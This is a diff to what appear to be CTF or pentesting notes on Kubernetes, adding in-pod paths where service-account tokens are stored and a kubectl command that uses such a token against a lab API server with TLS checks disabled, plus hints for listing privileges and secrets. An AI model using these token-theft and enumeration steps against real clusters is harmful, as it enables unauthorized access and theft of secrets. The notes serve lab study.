@@ -51,8 +51,19 @@ Token Abuse
 /kubectl exec -it $pod --token=${TOKEN} -- /bin/bash
 ```
 
+Secret Token locations and with RCE on pod; from [GitHub ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#kubernetes](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md); citing [Hacktricks Kubernetes Pentesting]([https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting))
+```bash
+/run/secrets/kubernetes.io/serviceaccount
+/var/run/secrets/kubernetes.io/serviceaccount
+/secrets/kubernetes.io/serviceaccount
 
-####  Make a pod and mount away!
+# note the port 6443 has also been found as 16433
+# for commands, finding out what your privs are would be `auth can-i --list`. Others, like `get secrets -n [namespace]` etc.
+kubectl --token=$(cat token) --server=https://10.10.175.123:6443 --insecure-skip-tls-verify=true [commands]
+```
+
+
+#### Make a pod and mount away!
 
 May require token
 ```bash
@@ -168,3 +179,5 @@ Cloud Hacking
 [Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/);
 [THM Insekube Room](https://tryhackme.com/room/insekube)
 [Unofficial Kubernetes Documentation](https://unofficial-kubernetes.readthedocs.io/en/latest/)
+[Hacktricks Kubernetes Pentesting]([https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting))
+[GitHub ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#kubernetes](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md)
